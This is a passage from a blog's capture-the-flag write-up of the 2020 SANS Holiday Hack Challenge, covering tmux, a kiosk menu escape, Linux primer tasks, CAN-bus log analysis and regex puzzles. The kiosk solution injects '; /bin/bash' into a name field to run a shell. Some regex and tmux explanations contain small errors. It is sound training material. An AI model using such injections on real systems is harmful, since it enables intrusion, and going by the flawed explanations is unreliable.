<!DOCTYPE html>
<html lang="en-us"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="generator" content="Hugo 0.80.0" />

    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="theme-color" content="#ffffff">


    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">

    
    <title>shiny-labs || KringleCon 3 - Holiday Hack Challenge 2020</title>
</head>
<body><nav class="navbar" role="navigation" aria-label="main navigation">
    <div class="navbar-brand">
        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
            <h1 id="logo" class="glitch">shiny-labs</h1>
        </a>
    </div>

    <div class="navbar-menu">
        <div class="navbar-start">
            
        </div>

        <div class="navbar-end">
            
            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
        </div>
    </div>
</nav>

<div id="content">

            <div class="columns is-centered">
                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
    <ul>
            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
  </ul>
</div>

<div class="columns">
<div class="column is-10" id="main-column">
    <article class="article">
        <div >
            <h1 class="article-title">KringleCon 3 - Holiday Hack Challenge 2020</h1>
            
<div class="post-meta">
  <p class="article-meta">
  <span>Date</span> &#x5b;
  <time datetime="January 14, 2021">
      Jan 14
    </time>
  &#x5d;
        
        
  <span>Categories</span> &#x5b;
    <a href="https://shiny-labs.re/categories/ctf">CTF</a>
  &#x5d;
        
        
  <span>Series</span> &#x5b;
    <a href="https://shiny-labs.re/series"></a>
  &#x5d;
        
        
  <span>Tags</span> &#x5b;
    <a href="https://shiny-labs.re/tags/blockchain">blockchain</a>
    <a href="https://shiny-labs.re/tags/scapy">scapy</a>
    <a href="https://shiny-labs.re/tags/canbus">CANbus</a>
    <a href="https://shiny-labs.re/tags/regexp">regexp</a>
    <a href="https://shiny-labs.re/tags/redis">redis</a>
    <a href="https://shiny-labs.re/tags/prng">PRNG</a>
  &#x5d;
  </p>
</div>

        </div>
        <div>
            <p>Here&rsquo;s my writeup for the <a href="https://holidayhackchallenge.com/2020/">2020 SANS Holiday Hack challenge: &lsquo;Zat You, Santa Claus? featuring KringleCon 3: French Hens</a>.</p>
<p>This year, the event has moved to Santa&rsquo;s newly renovated castle at the North Pole!</p>
<p>The goal is to solve the 11 objectives (well, 12 since the last objective has two parts) and save Christmas, of course. Along the way, terminals and mini-challenges can provide hints if you help the elf fix his troubles.</p>
<h1 id="terminals">Terminals</h1>
<h2 id="terminal-unescape-tmux-pepper-minstix">Terminal Unescape Tmux (Pepper Minstix)</h2>
<p>Description:</p>
<blockquote>
<p>Can you help me?</p>
<p>I was playing with my birdie (she&rsquo;s a Green Cheek!) in something called tmux, then I did something and it disappeared!</p>
<p>Can you help me find her? We were so attached!!</p>
</blockquote>
<p>Hint:</p>
<blockquote>
<p>Tmux Cheat Sheet
From: Pepper Minstix
There&rsquo;s a handy tmux reference available at <a href="https://tmuxcheatsheet.com/!">https://tmuxcheatsheet.com/!</a></p>
</blockquote>
<blockquote>
<p>Terminal Tips
From: Jewel Loggins
You can copy and paste in terminals with Ctrl-c and Ctrl-v or ⌘-c and ⌘-v.</p>
</blockquote>
<p>Solution:</p>
<p>Use <code>tmux list-sessions</code> to list the active sessions:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@c3caac9458e6:~$ tmux list-sessions
0: 1 windows (created Wed Jan  6 10:37:19 2021) [80x24]
</code></pre></div><p>There&rsquo;s only one session here, numbered 0, let&rsquo;s attach to it:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@c3caac9458e6:~$ tmux attach-sessions -t 0
</code></pre></div><p><img src="img/terminal_unescape_tmux_success.png" alt="terminal unescape tmux, successfully find the bird"></p>
<h2 id="terminal-kringle-kiosk-shiny-upatree">Terminal Kringle Kiosk (Shiny Upatree)</h2>
<p>Description:</p>
<blockquote>
<p>Welcome to our castle, we&rsquo;re so glad to have you with us!
Come and browse the kiosk; though our app&rsquo;s a bit suspicious.
Poke around, try running bash, please try to come discover,
Need our devs who made our app pull/patch to help recover?
Escape the menu by launching /bin/bash</p>
</blockquote>
<p>Hint:</p>
<blockquote>
<p>Command Injection
From: Shinny Upatree
There&rsquo;s probably some kind of <a href="https://owasp.org/www-community/attacks/Command_Injection">command injection</a> vulnerability in the menu terminal.</p>
</blockquote>
<p>Solution:</p>
<p>We are greeted by a menu:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Welcome to the North Pole!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. Map
2. Code of Conduct and Terms of Use
3. Directory
4. Print Name Badge
5. Exit
Please select an item from the menu by entering a single number.
Anything else might have ... unintended consequences.
Enter choice [1 - 5]
</code></pre></div><p>with some useful information, like the directory which lists people and where to find them:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Name:                 Floor:   Room:
Ribb Bonbowford       1        Dining Room
Noel Boetie           1        Wrapping Room
Ginger Breddie        1        Castle Entry
Minty Candycane       1.5      Workshop
Angel Candysalt       1        Great Room
Tangle Coalbox        1        Speaker UNPreparedness
Bushy Evergreen       2        Talks Lobby
Holly Evergreen       1        Kitchen
Bubble Lightington    1        Courtyard
Jewel Loggins                  Front Lawn
Sugarplum Mary        1        Courtyard
Pepper Minstix                 Front Lawn
Bow Ninecandle        2        Talks Lobby
Morcel Nougat         2        Speaker UNPreparedness
Wunorse Openslae      R        NetWars Room
Sparkle Redberry      1        Castle Entry
Jingle Ringford                NJTP
Piney Sappington      1        Castle Entry
Chimney Scissorsticks 2        Talks Lobby
Fitzy Shortstack      1        Kitchen
Alabaster Snowball    R        NetWars Room
Eve Snowshoes         3        Santa&#39;s Balcony
Shinny Upatree                 Front Lawn
Tinsel Upatree        3        Santa&#39;s Office
</code></pre></div><p>Or a map of the place:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"> __       _    --------------
|__)_  _ (_   | NetWars Room |
| \(_)(_)|    |              |
              |            * |
               --------------

__  __                              __  __
 _)|_                                _)|_          -------
/__|        Tracks                  __)|          |Balcony|
            1 2 3 4 5 6 7                          -------
 -------    -------------                             |
|Speaker|--| Talks Lobby |                        --------
|Unprep |  |             |                       |Santa&#39;s |
 -------    ------       |                       |Office  |
                  |      |                        --    --
                  |     *|                          |  |
                   ------                           |   ---
                                                    |    * |
    __                                               ------
 /||_
  ||                                          __ __           --------
  --------------------------              /| |_ |_           |Wrapping|
 |        Courtyard         |              |.__)|            |  Room  |
  --------------------------                                  --------
    |                    |                                       |
 ------    --------    ------                          ---    --------
|Dining|--|Kitchen |--|Great |                            |--|Workshop|
|      |   --------   |      |                            |  |        |
| Room |--|      * |--| Room |                            |  |        |
|      |  |Entryway|  |      |                            |  |        |
 ------    --------    ------                             |  |        |
               |                                             | *      |
           ----------                                         --------
          |Front Lawn|       NOTE: * denotes Santavator
           ----------
</code></pre></div><p>But how do we escape from that menu and run <code>/bin/bash</code> though? The hints points to a command injection, the easiest one on a Linux is to append a <code>; </code> followed by a second command.</p>
<p>I tried various menu items followed by <code>; /bin/bash</code> but none of them worked. Until! The <code>Print Name Badge</code> option! This one allows you to type your name and sure enough, this is where the command injection is ~~</p>
<p><img src="img/terminal_kringle_kiosk_success.png" alt="terminal kringle kiosk - successful command injection"></p>
<h2 id="terminal-linux-primer-sugarplum-mary">Terminal Linux Primer (Sugarplum Mary)</h2>
<blockquote>
<p>The North Pole 🍭 Lollipop Maker:
All the lollipops on this system have been stolen by munchkins. Capture munchkins by following instructions here and 🍭's will appear in the green bar below. Run the command &ldquo;hintme&rdquo; to receive a hint.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Type &#34;yes&#34; to begin:
elf@85fc8cc8352c:~$ yes
</code></pre></div><blockquote>
<p>Perform a directory listing of your home directory to find a munchkin and retrieve a lollipop!</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~$ ls
HELP  munchkin_19315479765589239  workshop
elf@63d2d00d258e:~$ cat HELP
Type the command hintme if you are in need of help during your journey.
You can also use the key combinations ( Ctrl+B ↑ or ↓ ) to resize the terminals.
</code></pre></div><blockquote>
<p>Now find the munchkin inside the munchkin.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~$ cat munchkin_19315479765589239
munchkin_24187022596776786
</code></pre></div><blockquote>
<p>Great, now remove the munchkin in your home directory.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~$ rm munchkin_19315479765589239
</code></pre></div><blockquote>
<p>Print the present working directory using a command.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~$ pwd
/home/elf
</code></pre></div><blockquote>
<p>Good job but it looks like another munchkin hid itself in you home directory. Find the hidden munchkin!</p>
</blockquote>
<p>The <code>-a</code> option of <code>ls</code> prints hidden files.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~$ ls -la
total 56
drwxr-xr-x 1 elf  elf   4096 Dec 20 10:32 .
drwxr-xr-x 1 root root  4096 Dec 10 18:14 ..
-rw-r--r-- 1 elf  elf     31 Dec 10 18:18 .bash_history
-rw-r--r-- 1 elf  elf    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elf  elf   3105 Dec  5 00:00 .bashrc
-rw-r--r-- 1 elf  elf      0 Dec 20 10:32 .munchkin_5074624024543078
-rw-r--r-- 1 elf  elf    807 Apr  4  2018 .profile
-rw-r--r-- 1 elf  elf    168 Dec  5 00:00 HELP
drwxr-xr-x 1 elf  elf  20480 Dec 10 18:19 workshop
</code></pre></div><blockquote>
<p>Excellent, now find the munchkin in your command history.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~$ cat .bash_history
echo munchkin_9394554126440791
</code></pre></div><blockquote>
<p>Find the munchkin in your environment variables.</p>
</blockquote>
<p><code>env</code> lists all environment variables, <code>| grep munchkin</code> will filter the ones that contain the word <code>munchkin</code></p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~$ env | grep munchkin
z_MUNCHKIN=munchkin_20249649541603754
</code></pre></div><blockquote>
<p>Next, head into the workshop.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~$ cd workshop
</code></pre></div><blockquote>
<p>A munchkin is hiding in one of the workshop toolboxes. Use &ldquo;grep&rdquo; while ignoring case to find which toolbox the munchkin is in.</p>
</blockquote>
<p>The <code>-i</code> option will ignore the case and <code>-r .</code> will search recursively in the current directory</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~/workshop$ grep -i munchkin -nr .
./toolbox_191.txt:1:mUnChKin.4056180441832623
</code></pre></div><blockquote>
<p>A munchkin is blocking the lollipop_engine from starting. Run the lollipop_engine binary to retrieve this munchkin.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~/workshop$ chmod +x lollipop_engine
elf@85fc8cc8352c:~/workshop$ ./lollipop_engine
munchkin.898906189498077
</code></pre></div><blockquote>
<p>Munchkins have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~/workshop$ cd /home/elf/workshop/electrical
elf@85fc8cc8352c:~/workshop/electrical$ mv blown_fuse0 fuse0
</code></pre></div><blockquote>
<p>Now, make a symbolic link (symlink) named fuse1 that points to fuse0</p>
</blockquote>
<p>The <code>ln</code> command is for making links between files, <code>-s</code> is for a symbolic links.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~/workshop/electrical$ ln -s fuse0 fuse1
</code></pre></div><blockquote>
<p>Make a copy of fuse1 named fuse2.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~/workshop/electrical$ cp fuse1 fuse2
</code></pre></div><blockquote>
<p>We need to make sure munchkins don&rsquo;t come back. Add the characters &ldquo;MUNCHKIN_REPELLENT&rdquo; into the file fuse2.</p>
</blockquote>
<p><code>&gt;</code> is used to redirect the ouput of the echo command to a file named fuse2</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~/workshop/electrical$ echo &#34;MUNCHKIN_REPELLENT&#34; &gt; fuse2
</code></pre></div><blockquote>
<p>Find the munchkin somewhere in /opt/munchkin_den.</p>
</blockquote>
<p>The <code>-iname</code> will match a filename while ignoring the case. <code>*</code> are used to match any filename that contains munchkin, regardless of what&rsquo;s before or after</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:/opt/munchkin_den$ find /opt/munchkin_den/ -iname &#34;*munchkin*&#34;
/opt/munchkin_den/
/opt/munchkin_den/apps/showcase/src/main/resources/mUnChKin.6253159819943018
</code></pre></div><blockquote>
<p>Find the file somewhere in /opt/munchkin_den that is owned by the user munchkin.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:/opt/munchkin_den$ find /opt/munchkin_den/ -user &#34;munchkin&#34;
/opt/munchkin_den/apps/showcase/src/main/resources/template/ajaxErrorContainers/niKhCnUm_9528909612014411
</code></pre></div><blockquote>
<p>Find the file created by munchkins that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/munchkin_den.</p>
</blockquote>
<p><code>-size +108k</code> matches a size greater than 108k, and <code>-size -110k</code> less than 110k</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@79734ab2c6d1:~/workshop/electrical$ find /opt/munchkin_den -size +108k -size -110k
/opt/munchkin_den/plugins/portlet-mocks/src/test/java/org/apache/m_u_n_c_h_k_i_n_2579728047101724
</code></pre></div><blockquote>
<p>List running processes to find another munchkin.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~/workshop/electrical$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
init         1  0.0  0.0  65320 21100 pts/0    Ss+  16:42   0:00 /usr/bin/python3 /usr/local/bin/tmuxp load ./mysession.yaml
elf      20701  1.2  0.0  84316 26240 pts/2    S+   17:36   0:00 /usr/bin/python3 /14516_munchkin
elf      21290  0.0  0.0  36180  3332 pts/3    R+   17:36   0:00 ps aux
</code></pre></div><blockquote>
<p>The 14516_munchkin process is listening on a tcp port. Use a command to have the only listening port display to the screen.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~/workshop/electrical$ netstat -plnt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:54321           0.0.0.0:*               LISTEN      20701/python3
</code></pre></div><blockquote>
<p>The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last munchkin.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~/workshop/electrical$ curl 0.0.0.0:54321
munchkin.73180338045875elf@79734ab2c6d1:~/workshop/electrical$
</code></pre></div><blockquote>
<p>Your final task is to stop the 14516_munchkin process to collect the remaining lollipops.</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@85fc8cc8352c:~/workshop/electrical$ ps aux | grep 14516_munchkin
elf      20701  0.1  0.0 160448 26900 pts/2    S+   17:36   0:00 /usr/bin/python3 /14516_munchkin
elf      26570  0.0  0.0  13240  1064 pts/3    S+   17:39   0:00 grep --color=auto 14516_munchkin
elf@79734ab2c6d1:~/workshop/electrical$ kill 20701
</code></pre></div><h2 id="santa-portrait">Santa Portrait</h2>
<p>The secret corridor behind the secret portrait can be accessed from the door on the left side of the workshop room. This is unlocked after you solve objective 5 on the HID lock. Going through the painting will allow you to walk into the entry as Santa. To become yourself again, you need to walk backwards: ie go throught the painting from the entry.</p>
<h2 id="336kbps-fitzy-shortstack">33.6kbps (Fitzy Shortstack)</h2>
<p>Description:</p>
<blockquote>
<p>&ldquo;Put it in the cloud,&rdquo; they said&hellip;
&ldquo;It&rsquo;ll be great,&rdquo; they said&hellip;
All the lights on the Christmas trees throughout the castle are controlled through a remote server.
We can shuffle the colors of the lights by connecting via dial-up, but our only modem is broken!
Fortunately, I speak dial-up. However, I can&rsquo;t quite remember the <a href="https://upload.wikimedia.org/wikipedia/commons/3/33/Dial_up_modem_noises.ogg">handshake sequence</a>.
Maybe you can help me out? The phone number is 756-8347; you can use this blue phone.</p>
</blockquote>
<p>Solution:</p>
<p><img src="img/image-20201221081305048.png" alt="image-20201221081305048"></p>
<p>This mini-challenge is a tribute to the old days! To be able to make a phone call:</p>
<ol>
<li>Listen way too many time to the handshake sequence mp3</li>
<li>Click the handset</li>
<li>Compose the phone number: 7 5 6 8 3 4 7</li>
<li>Click on the &ldquo;spoken dial-up words&rdquo; in the right order to reproduce the handshake sequence:
<ol>
<li>baa DEE brrr</li>
<li>aaah</li>
<li>WEWEWwrwrrwrr</li>
<li>beDURRdunditty</li>
<li>SCHHRRHHRTHRTR</li>
</ol>
</li>
</ol>
<h2 id="terminal-can-bus-investigation-wunorse-openslae">Terminal CAN-Bus Investigation (Wunorse Openslae)</h2>
<p>Description:</p>
<blockquote>
<p>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX00OkxxddcddxxkOO0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMWXOxoc:c.;cccccc.ccccc:.:c:ldxOXMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMXkoc&rsquo;,ccccc:.:ccccc.ccccc.;cccc,'::cdOXMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMM0xc:cccc,':cccc::ccccccccccccccc:.;cccccc:lxXMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMNkl,',:ccccc;;ccccccccccccccccccccc::cccccc:,',:lOWMMMMMMMMMMMMM
MMMMMMMMMMMMNxccccc;';cccccccccccccccccccccccccccccccccc;':cccccckWMMMMMMMMMMM
MMMMMMMMMMNdcccccc:..;cccccccccccccccccccccccccccccccccccccccccccc:kWMMMMMMMMM
MMMMMMMMM0c,,,,:cccc;..;cccccccccccccccccccccccccccccccccccccc:,,,;:lKMMMMMMMM
MMMMMMMWd:cccc;:cccccc;..,cccccccccccccccccccccccccccccccccccc;:cccccckMMMMMMM
MMMMMMNlcccccccccccccccc:..,:ccccccccccccccccccccccccccccccccccccccccc:oWMMMMM
MMMMMNc,,,,,:ccccccccccccc:..':cccccccccccccccccccccccccccccccccc:,,,,,;oWMMMM
MMMMWoccccc::ccccccccccccccc:'.':cccccccccccccccccccccccccccccccc::ccccccxMMMM
MMMMkccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccccc:0MMM
MMMN::cccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccc:cWMM
MMMk,,,,,:cccccccccccccccccccccccc:,..;ccccccccccccccccccccccccccccc:,,,,,;0MM
MMMlccccccccccccccccccccccccccccccccc,.;cccccccccccccccccccccccccccccccccccdMM
MMW:ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccclMM
MMWOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0MM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</p>
<p>Welcome to the CAN bus terminal challenge!
In your home folder, there&rsquo;s a CAN bus capture from Santa&rsquo;s sleigh. Some of
the data has been cleaned up, so don&rsquo;t worry - it isn&rsquo;t too noisy. What you
will see is a record of the engine idling up and down. Also in the data are
a LOCK signal, an UNLOCK signal, and one more LOCK. Can you find the UNLOCK?
We&rsquo;d like to encode another key mechanism.
Find the decimal portion of the timestamp of the UNLOCK code in candump.log
and submit it to ./runtoanswer!  (e.g., if the timestamp is 123456.112233,
please submit 112233)</p>
</blockquote>
<p>Hint:</p>
<blockquote>
<p><em>From: Wunorse Openslae</em>
Chris Elgee is talking about how <a href="https://www.youtube.com/watch?v=96u-uHRBI0I">CAN traffic</a> works right now! You can hide lines you don&rsquo;t want to see with commands like <code>cat file.txt | grep -v badstuff</code></p>
</blockquote>
<p>Solution:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@7f717cc6c0a7:~$ ls
candump.log  runtoanswer
elf@7f717cc6c0a7:~$ head candump.log
(1608926660.800530) vcan0 244#0000000116
(1608926660.812774) vcan0 244#00000001D3
(1608926660.826327) vcan0 244#00000001A6
(1608926660.839338) vcan0 244#00000001A3
(1608926660.852786) vcan0 244#00000001B4
(1608926660.866754) vcan0 244#000000018E
(1608926660.879825) vcan0 244#000000015F
(1608926660.892934) vcan0 244#0000000103
(1608926660.904816) vcan0 244#0000000181
(1608926660.920799) vcan0 244#000000015F
</code></pre></div><p>We have a candump log, let&rsquo;s start by filtering the unique CAN IDs. The command below takes the content of candump.log, then split on the space character and select the 3 column. In that third column, we keep everything before the <code>#</code>. Finally, we order them with sort so that duplicates are grouped and uniq can remove them.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@788d42b87ff2:~$ cat candump.log | cut -d&#39; &#39; -f3 | cut -d&#39;#&#39; -f1 | sort | uniq
188
19B
244
</code></pre></div><p>There are 3 unique IDs:</p>
<ul>
<li>244 is probably the engine, as it&rsquo;s the most noisy and sending updates all the time</li>
<li>188 is just sending empty data</li>
<li>19B looks like it could be our lock, it only sends 2 types of messages: <code>000000000000</code> and <code>00000F000000</code>.</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@788d42b87ff2:~$ cat candump.log | grep &#34;vcan0 19B&#34;
(1608926664.626448) vcan0 19B#000000000000
(1608926671.122520) vcan0 19B#00000F000000
(1608926674.092148) vcan0 19B#000000000000
</code></pre></div><p>Furthemore, the 3 packets sent by ID 19B match the LOCK/UNLOCK/LOCK from the challenge description, so the UNLOCK packet is the one sent at 1608926671.122520.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@788d42b87ff2:~$ ./runtoanswer
There are two LOCK codes and one UNLOCK code in the log.  What is the decimal portion of t
he UNLOCK timestamp?
(e.g., if the timestamp of the UNLOCK were 1608926672.391456, you would enter 391456.
&gt; 122520
Your answer: 122520
Checking....
Your answer is correct!
</code></pre></div><h2 id="sort-o-matic-minty-candycane">SORT-O-MATIC (Minty Candycane)</h2>
<p>Description:</p>
<blockquote>
<p>About
The SORT-O-MATIC is responsible for separating properly wrapped presents from disfunctional misfit presents. Properly wrapped presents are put into Santa&rsquo;s gift bag while the misfit toys are dropped into a box with a portal to the Island of Misfit Toys.</p>
<p>The SORT-O-MATIC&rsquo;s configuration works using regular expressions. When all eight regular expressions match the desired values the SORT-O-MATIC will properly sort presents.</p>
<p>Troubleshooting
If the SORT-O-MATIC is NOT sorting presents at 100% accuracy, you will need to add the desired regex in the invalid (red-highlighted) inputs and then click the corresponding toggle switch. If you provide the correct regular expression and toggle the switch, the input will turn green and the progress bar will grow. You must reach 100% accuracy in order to fix the SORT-O-MATIC.</p>
<p>Click on the description above each input to display a message with more details about the desired regular expression.</p>
<p>Click the HELP button on the SORT-O-MATIC to view this help manual again.</p>
</blockquote>
<p>Hint:</p>
<blockquote>
<p>JavaScript Regex Cheat Sheet
From: Minty Candycane
Handy quick reference for JS regular expression construction: <a href="https://www.debuggex.com/cheatsheet/regex/javascript">https://www.debuggex.com/cheatsheet/regex/javascript</a></p>
</blockquote>
<blockquote>
<p>Regex Practice
From: Minty Candycane
Here&rsquo;s a place to try out your JS Regex expressions: <a href="https://regex101.com/">https://regex101.com/</a></p>
</blockquote>
<p>For this challenge, I used <a href="https://regex101.com/">https://regex101.com/</a> a lot to debug my regexp with test data.</p>
<ol>
<li>Create a Regex That Matches All Digits
Create a regular expression that will only match any string containing at least one digit.</li>
</ol>
<p><code>\d</code> matches a digit, <code>.*</code> matches any character repeated any number of time</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">.*\d.*
</code></pre></div><ol start="2">
<li>Create a Regex That Matches 3 or More Alpha Characters Ignoring Case
Create a regular expression that will only match only alpha characters A-Z of at least 3 characters in length or greater while ignoring case.</li>
</ol>
<p><code>[a-zA-Z]</code> will match any character, regardless of the case and
<code>{3,}</code> will match if there are at least 3 of them.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[a-zA-Z]{3,}
</code></pre></div><ol start="3">
<li>Create a Regex That Matches Two Consecutive Lowercase a-z or numeric characters.
Create a regular expression that will only match at least two consecutive lowercase a-z or numeric characters.</li>
</ol>
<p><code>[a-z0-9]</code> matches a lowercase letter or a number</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[a-z0-9][a-z0-9]
</code></pre></div><ol start="4">
<li>Any two characters that are not uppercase A-L or 1-5
Create a regular expression that will only match any two characters that are NOT uppercase A through L and NOT numbers 1 through 5.</li>
</ol>
<p><code>^</code> is a negative condition, so <code>^A-L1-5</code> will exclude characters any lowercase characters from A to L and any number from 1 to 5. And <code>{2,}</code> ensures there are at least 2 characters matched.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">([^A-L1-5]){2,}
</code></pre></div><ol start="5">
<li>Create a Regex To Match a String of 3 Characters in Length or More Composed of ONLY Digits
Create a regular expression that only matches if the entire string is composed of entirely digits and is at least 3 characters in length.</li>
</ol>
<p><code>^</code> means the beginning of the line, <code>\d{3,}</code> matches at least 3 digits and <code>$</code> is the end of the line.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">^\d{3,}$
</code></pre></div><ol start="6">
<li>Create A Regex To Match Multiple Hour:Minute:Second Time Formats Only
Create a regular expression that only matches if the entire string is a valid Hour, Minute and Seconds time format similar to the following:</li>
</ol>
<p>12:24:53
1:05:24
23:02:43
08:04:10</p>
<p>However, the following would be invalid:</p>
<p>25:30:86
A1:E4:B5
B2:13:4A
32:24:53
08:74:53
12:5:24</p>
<p>Use anchors or boundary markers to avoid matching other surrounding strings.</p>
<p>A first group to match the hours: <code>([0,1,2]?\d)</code></p>
<ul>
<li>an optional first digit with the value <code>0</code>, <code>1</code> or <code>2</code></li>
<li>any digit</li>
</ul>
<p>A second group with matches twice for the minutes and seconds: <code>(:[0-5][0-9]){2}</code>:</p>
<ul>
<li>a double colon <code>:</code></li>
<li>a first digit between 0 and 5</li>
<li>a second digit between 0 and 9</li>
</ul>
<p>Putting it together with <code>^</code> for the start of line and <code>$</code> for the end of line:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">^([0,1,2]?\d)(:[0-5][0-9]){2}$
</code></pre></div><ol start="7">
<li>Create A Regular Expression That Matches The MAC Address Format Only While Ignoring Case
Create a regular expression that only matches if the entire string is a MAC address. For example:</li>
</ol>
<p>00:0a:95:9d:68:16
76:A4:5A:D2:69:93
B8:13:13:D1:18:EC
95:ce:00:4a:22:df</p>
<p>However, the following would be examples of invalid MAC Addresses:
97:z2:gf:c4:02:c2
de:140:130:69:7_-bd
C0:HH:EE:50:B7:C3</p>
<p>Use anchors or boundary markers to avoid matching other surrounding strings.</p>
<p>we build a first group to match 2 hex character followed by <code>:</code>, that group will repeat 5 times:</p>
<ul>
<li><code>[A-Fa-f-0-9]{2}</code>: 2 hex characters</li>
<li><code>:</code> double-colon symbol</li>
</ul>
<p>And a second group to match just 2 hex characters:</p>
<ul>
<li><code>[A-Fa-f-0-9]{2}</code>: 2 hex characters</li>
</ul>
<p>Adding <code>^</code> for beginning of line and <code>$</code> for end of line:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">^([A-Fa-f-0-9]{2}:){5}[A-Fa-f-0-9]{2}$
